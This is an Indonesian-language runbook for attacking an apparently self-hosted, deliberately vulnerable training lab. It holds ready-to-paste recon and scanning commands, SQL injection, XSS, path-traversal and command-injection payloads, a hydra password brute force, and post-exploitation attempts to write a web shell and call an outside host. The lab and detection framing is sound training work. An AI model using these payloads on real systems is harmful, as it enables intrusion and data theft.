BAB 1Persiapan & verifikasi target

Pastikan Anda menyerang salinan lab yang benar sebelum mengirim satu payload pun.

1.1 Konstanta target

NilaiIsi
IP VPS72.62.120.97
Port lab8080
Base URL labhttp://72.62.120.97:8080
Control center (JANGAN diserang)https://youngowl.srv1248893.hstgr.cloud

1.2 Verifikasi vulnMode

curl -s http://72.62.120.97:8080/api/v1/system/health | jq
# Harus: { "status": "ok", "vulnMode": true }
Bila vulnMode bukan true, berhenti — Anda menyentuh salinan aman dan tidak akan menemukan apa pun. Pastikan stack lab berjalan: docker compose -f docker-compose.lab.yml -p youngowl-lab ps.

1.3 Kenapa bukan subdomain control center

Contoh yang Anda beri — sqlmap -u "https://youngowl.srv1248893.hstgr.cloud/dashboard" ... — menyasar control center. Itu salinan aman (VULN_MODE=false): tidak ada celah tertanam, memakai database asli Anda, dan berada di balik HTTPS/Traefik. Runbook ini sengaja memakai http://72.62.120.97:8080 agar Anda menyerang sasaran yang memang dibuat untuk diserang.

BAB 3Reconnaissance & Enumerasi

3.1 Port & versi layanan

nmap -sn 72.62.120.97
nmap -sS -p- --min-rate 1000 72.62.120.97
nmap -sV -sC -p 8080 72.62.120.97
nmap -p 8080 --script=http-headers,http-methods,http-security-headers 72.62.120.97 -oA recon_nmap

3.2 Content discovery (endpoint)

ffuf -u http://72.62.120.97:8080/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,401,403

ffuf -u http://72.62.120.97:8080/api/v1/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,401,403

gobuster dir -u http://72.62.120.97:8080 \
  -w /usr/share/wordlists/dirb/common.txt -t 30

3.3 Parameter discovery

ffuf -u "http://72.62.120.97:8080/api/v1/targets/search?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 0
Jejak: ratusan 404 beruntun dari satu IP + user-agent ffuf/gobuster → kelas recon.

BAB 4Vulnerability Scanning

nikto -h http://72.62.120.97:8080 -o nikto.txt

nuclei -u http://72.62.120.97:8080 -severity medium,high,critical

# Deteksi SQLi (belum dump)
sqlmap -u "http://72.62.120.97:8080/api/v1/targets/search?q=1" --batch --level=2 --risk=2
Inilah padanan contoh Anda, tetapi diarahkan ke endpoint lab yang memang rentan. Perhatikan: targetnya adalah /api/v1/targets/search?q=1 (punya parameter yang diuji), bukan /dashboard yang tidak menerima input injectable.

BAB 5Exploitation (per celah)

Semua perintah memakai URL lab penuh. Login dulu untuk endpoint yang butuh sesi.

5.0 Login & simpan sesi

curl -s -c cookies.txt -X POST "http://72.62.120.97:8080/api/v1/auth/login" \
  -H 'content-type: application/json' \
  -d '{"email":"intern@youngowl.lab","password":"<password>"}'

5.1 SQL injection (A03)

# Buktikan injeksi
curl -s -G "http://72.62.120.97:8080/api/v1/targets/search" --data-urlencode "q=zzz'"

# Cari jumlah kolom
curl -s -G "http://72.62.120.97:8080/api/v1/targets/search" --data-urlencode "q=zzz' ORDER BY 6-- "

# Tarik flag via UNION
curl -s -G "http://72.62.120.97:8080/api/v1/targets/search" \
  --data-urlencode "q=zzz' UNION SELECT id,name,value,hint,'x','x' FROM lab_flags-- "

# Atau otomatis
sqlmap -u "http://72.62.120.97:8080/api/v1/targets/search?q=test" --batch --dump -T lab_flags

5.2 Stored XSS (A03)

curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/findings" \
  -H 'content-type: application/json' \
  -d '{"description":"<img src=x onerror=\"document.title='xss-by-me'\">"}'
# Buka halaman assessment; judul tab berubah = skrip jalan

5.3 IDOR (A01)

curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/assessments/<id-orang-lain>/export"
# Naikkan / tebak id untuk membaca export milik akun lain

5.4 Path traversal (A01)

curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/files?name=....//secret/flag.txt"

5.5 Command injection / RCE (A03)

curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" \
  -H 'content-type: application/json' \
  -d '{"host":"localhost; id"}'
# Output id = RCE terbukti

5.6 Kelemahan autentikasi (A07)

hydra -l intern@youngowl.lab -P /usr/share/wordlists/rockyou.txt \
  72.62.120.97 -s 8080 http-post-form \
  "/api/v1/auth/login:email=^USER^&password=^PASS^:No account"

5.7 Misconfiguration / kebocoran rahasia (A05)

curl -s http://72.62.120.97:8080/api/v1/system/debug | jq
Jejak gabungan: tiap serangan di atas memunculkan baris baru di tab Exploitation Lab control center (kelas sqli/xss/idor/traversal/rce/auth) — buka monitor sambil menyerang untuk melihatnya langsung.

BAB 6Post-Exploitation (via RCE, di lab)

Hanya di lab Anda. Tujuannya memahami & mendeteksi, bukan menyamar di sistem nyata. Lab memblokir egress & read-only, jadi web shell / reverse shell akan gagal — itu bagian dari pelajaran.

6.1 Orientasi

curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"localhost; id"}'
curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"localhost; uname -a"}'
curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"localhost; env"}'

6.2 Uji batas isolasi (harus gagal)

# Coba tulis web shell — gagal karena filesystem read-only
curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"localhost; echo x > /app/public/shell.js"}'

# Coba koneksi keluar — gagal karena egress diblokir
curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"localhost; curl -m 3 http://example.com"}'

6.3 Perburuan di server Anda (sisi defender)

# jalankan di VPS, bukan dari Kali
docker compose -f docker-compose.lab.yml -p youngowl-lab logs -f api
crontab -l ; systemctl list-timers --all ; ss -tlnp

BAB 7Blok sekali-tempel & checklist

7.1 Recon + scan (satu tempel)

T=http://72.62.120.97:8080
curl -sI $T/ ; whatweb $T ; wafw00f -a $T
curl -s $T/robots.txt
nmap -sV -sC -p 8080 72.62.120.97
ffuf -u $T/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,401,403
nikto -h $T ; nuclei -u $T -severity medium,high,critical
sqlmap -u "$T/api/v1/targets/search?q=1" --batch --level=2 --risk=2

7.2 Exploit (satu tempel)

T=http://72.62.120.97:8080
curl -s -G "$T/api/v1/targets/search" --data-urlencode "q=zzz' UNION SELECT id,name,value,hint,'x','x' FROM lab_flags-- "
curl -s -b cookies.txt "$T/api/v1/files?name=....//secret/flag.txt"
curl -s -b cookies.txt -X POST "$T/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"localhost; id"}'
curl -s $T/api/v1/system/debug | jq

7.3 Checklist

  • ☐ vulnMode=true terverifikasi.
  • ☐ Target selalu 72.62.120.97:8080, bukan subdomain control center.
  • ☐ Recon → scan → exploit → post-exploit dijalankan berurutan.
  • ☐ Monitor Exploitation Lab dibuka sambil menyerang.
  • ☐ Temuan dicatat ke assessment untuk laporan.
